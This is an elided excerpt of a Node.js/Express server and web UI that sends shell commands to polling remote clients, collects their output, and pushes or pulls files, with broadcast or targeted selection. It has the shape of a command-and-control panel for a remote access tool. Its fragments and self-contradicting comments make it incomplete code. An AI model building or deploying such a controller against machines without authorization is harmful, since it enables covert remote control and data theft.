...
// ---------- State ----------
const clients = new Map(); // clientId -> { cwd, tasks, env, lastTaskId, connected }
const clientOutputs = new Map(); // clientId -> last output
let latestCommand = { id: 0, cmd: '' };
let taskIdCounter = 0;

// UI state: selected clients (include/exclude)
const selectedInclude = new Set();
const selectedExclude = new Set();

// ---------- Helper ----------
function getTargetClients() {
  // 'none' mode: all clients
  const all = Array.from(clients.keys());
  if (selectedInclude.size === 0 && selectedExclude.size === 0) return all;
  if (selectedInclude.size > 0) {
    return all.filter(id => selectedInclude.has(id));
  }
  return all.filter(id => !selectedExclude.has(id));
}
  ...
  <script>
    ...
    async function fetchData() {
      try {
        ...
        // data: { clients: [ {id, output, cwd} ] }
        // We need to update terminal lines with checkboxes.
        // But the original UI appended lines dynamically.
        // We'll clear and rebuild terminal based on clients.
        terminal.innerHTML = '';
        for (const client of data.clients) {
          const text = `[${client.id}] ${client.output || 'No output'}`;
          const cls = client.output && client.output.includes('error') ? 'error' : '';
          appendLine(text, cls);
        }
        // Update title with cwd? We'll just show first client's cwd.
    ...
    async function sendCommand(cmd) {
      ...
      const payload = { cmd };
      if (targets !== null) {
        payload.targets = Array.from(targets);
      }
      try {
        await fetch('/command', {
          method: 'POST',
    ...
    document.getElementById('uploadBtn').addEventListener('click', async () => {
      ...
      if (targets !== null) {
        formData.append('targets', JSON.stringify(Array.from(targets)));
      }
      try {
    ...
    document.getElementById('downloadBtn').addEventListener('click', async () => {
      ...
      try {
        ...
        if (result.downloadUrl) {
          appendLine('[System] Download ready: ' + result.downloadUrl, 'system');
          // Trigger download
...
app.get('/poll', (req, res) => {
  ...
  // For simplicity, we give the latest command if any, but we need to avoid repeated commands.
  // We'll use a per-client command id tracking.
  // But we already have a global latestCommand and per-client lastCommandId.
  // We'll adapt: if latestCommand.id > client.lastCommandId, return it.
  // Also handle file upload tasks.
  // We'll store file upload tasks in client.tasks.
  // Return task if any.
  let task = null;
  // Check for pending file tasks first
  if (client.tasks.length > 0) {
    task = client.tasks.shift();
  } else if (latestCommand.id > client.lastCommandId) {
...
// ---------- Client result (output or file data) ----------
app.post('/result', (req, res) => {
  ...
  const client = clients.get(clientId);
  if (taskId && taskId > client.lastCommandId) {
    client.lastCommandId = taskId;
  }
  if (output !== undefined) {
  ...
  if (fileData) {
    // Store file temporarily and generate URL
    const filename = `download_${Date.now()}_${clientId}.bin`;
    const filePath = path.join(__dirname, 'downloads', filename);
    if (!fs.existsSync('downloads')) fs.mkdirSync('downloads');
    fs.writeFileSync(filePath, Buffer.from(fileData, 'base64'));
    const downloadUrl = `/downloads/${filename}`;
    // We'll send back to UI later via /clients? Not needed; UI will poll.
    // But we need to notify the UI that a file is ready.
    // We'll store a pending download for that client.
    client.pendingDownload = downloadUrl;
  }
  res.json({ ok: true });
});
...
// ---------- Get clients list (for UI) ----------
app.get('/clients', (req, res) => {
  const list = [];
  for (const [id, client] of clients) {
    const output = clientOutputs.get(id) || '';
    const cwd = client.cwd || '/';
    list.push({ id, output, cwd });
  }
...
app.post('/command', (req, res) => {
  ...
  // Increment global command id
  latestCommand.id++;
  latestCommand.cmd = cmd;
  // If targets specified, we need to send to only those clients.
  // We can set a flag, but we'll use the per-client lastCommandId approach.
  // However, we have a global latestCommand that all clients will see.
  // To target, we can store the command with a target list and clients check if they are in target list.
  // For simplicity, we'll just broadcast to all for now.
  // But the UI already computes targets and sends them; we'll ignore targets here for simplicity.
  // Actually, the UI sends the command and targets; we need to store per-client tasks.
  // Better: when a command is sent with targets, we create a task for each targeted client.
  // For now, we'll just broadcast.
  // But we want include/exclude to work. The UI computes targets and sends them.
  // We can create a task per client.
  if (targets && Array.isArray(targets)) {
    for (const clientId of targets) {
      if (clients.has(clientId)) {
        const client = clients.get(clientId);
        client.tasks.push({ type: 'command', cmd, id: latestCommand.id });
      }
    }
  } else {
    // Broadcast to all
...
app.post('/upload', upload.single('file'), (req, res) => {
  ...
  // Create upload task for targeted clients
...
app.post('/download-request', (req, res) => {
  ...
  // Create download task for targeted clients
  ...
  if (targetList.length > 0) {
    ...
    // Broadcast to all (or first available)
    const first = clients.keys().next().value;
    if (first) {
      clients.get(first).tasks.push(task);
    }
  }
  // We'll generate a download URL later when client responds.
